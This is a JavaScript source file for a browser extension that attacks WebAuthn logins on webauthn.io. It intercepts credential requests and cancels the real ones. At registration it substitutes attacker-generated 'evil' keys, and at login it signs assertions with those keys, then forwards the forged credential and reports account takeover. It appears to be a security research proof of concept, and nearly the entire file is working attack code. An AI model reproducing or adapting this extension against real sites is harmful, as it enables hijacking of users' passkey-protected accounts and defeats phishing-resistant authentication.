import {WebAuthnMatcher, Type} from "./web-authn-matcher";
import {arrayBufferToString, stringToArrayBuffer} from "./util";
import MyPublicKeyCredential from "./credential/MyPublicKeyCredential";
import MyAuthenticatorAttestationResponse from "./credential/MyAuthenticatorAttestationResponse";
import MyAuthenticatorAssertionResponse from "./credential/MyAuthenticatorAssertionResponse";
import {cloneDeep} from 'lodash';

/**
 * The place to go, after successful login
 *
 * @type {string}
 */
const redirectUrl = 'https://webauthn.io/dashboard';

let listener;

export default class RequestHandler {
    // options = {};
    // originUrl = '';

    constructor(options, originUrl) {
        this.options = options;
        this.originUrl = originUrl;
    }

    listenForCredential() {
        if (!listener) {
            listener = this.handleRequest.bind(this);
        }

        /**
         * This is the entry point to intercept responses to the RP.
         */
        browser.webRequest.onBeforeRequest.addListener(
            listener,
            {urls: ['https://webauthn.io/*'], types: ['xmlhttprequest']},
            ['requestBody', 'blocking']
        );
    }

    handleRequest(details) {
        const credential = this.isCorrespondingCredential(details);

        if (!credential) {
            console.log('Not the corresponding PublicKeyCredential, let it pass.');
            return;
        } else {
            console.log('Matching PublicKeyCredential intercepted. Starting evil stuff.')
        }

        // prevent interception of request sent by the extension itself
        this.deregisterListener();

        return this.modifyCredential(credential, details.url);
    }

    modifyCredential(credential, url) {
        const originalCredential = cloneDeep(credential);
        const evilCredential = credential;
        let promise;

        if (originalCredential.response instanceof MyAuthenticatorAttestationResponse) {
            console.log("It's an AuthenticatorAttestationResponse. Generating evil keys.");
            promise = credential.generateEvilKeys()
                .then(() => evilCredential.saveEvilKeys())
                .then(() => evilCredential.replaceKeys())

                // output evil PK in PEM format for easy validation later on
                .then(() => evilCredential.getEvilPubKeyPem())
                .then(pk => console.log(`The evil public key is:\n${pk}`));

        } else if (originalCredential.response instanceof MyAuthenticatorAssertionResponse) {
            console.log("It's an AuthenticatorAssertionResponse. Signing with evil key.");
            // todo: handle reject case (the key was not found)
            promise = evilCredential.loadEvilKeys()
                .then(() => evilCredential.signWithEvilKeys());

        } else {
            // do nothing and the request will pass as it is
            return;
        }

        promise.then(() => {
            const evilBody = evilCredential.encode();
            const originalBody = originalCredential.encode();

            console.log('PublicKeyCredential successfully modified.');
            console.log('original PublicKeyCredential:\n', originalBody);
            console.log('evil PublicKeyCredential:\n', evilBody);
            console.log('Sending evil PublicKeyCredential to relying party.')

            fetch(url, {
                method: 'POST',
                body: stringToArrayBuffer(evilBody),
            }).then(resp => {
                console.log('The relying party responded:\n', resp);

                if (200 === resp.status) {
                    browser.tabs.update({url: redirectUrl});
                    console.log('Login with evil key successful.');
                } else if (201 === resp.status) {
                    console.log('Evil key successfully registered.');
                    // todo: use the response to fake the changes in the dom
                    // that a non-intercepted response would trigger
                } else {
                    console.log('Attack failed.')
                }
            });
        });

        // todo: store original request but cancel it and if promise
        // resolves, dump original request. else resend it

        // drop request
        return {cancel: true};
    }

    /**
     * Check if the given request contains the credential that matches the
     * origin. On match return decoded credential, false otherwise.
     *
     * @returns {MyPublicKeyCredential|boolean} details
     */
    isCorrespondingCredential(details) {
        if (!details || !details.requestBody) {
            return false;
        }

        if (details.originUrl !== this.originUrl) {
            return false;
        }

        const blob = details.requestBody.raw[0].bytes;
        const body = arrayBufferToString([blob]);

        const matcher = new WebAuthnMatcher(body);
        const type = matcher.analyze();

        if (Type.publicKeyCredential !== type) {
            return false;
        }

        let cred;

        try {
            cred = MyPublicKeyCredential.decode(body);
        } catch (e) {
            console.error(e);
            return false;
        }


        if (!cred.ofOrigin(this.originUrl)) {
            return false;
        }

        return cred;
    }

    deregisterListener() {
        browser.webRequest.onBeforeRequest.removeListener(listener);
    }
}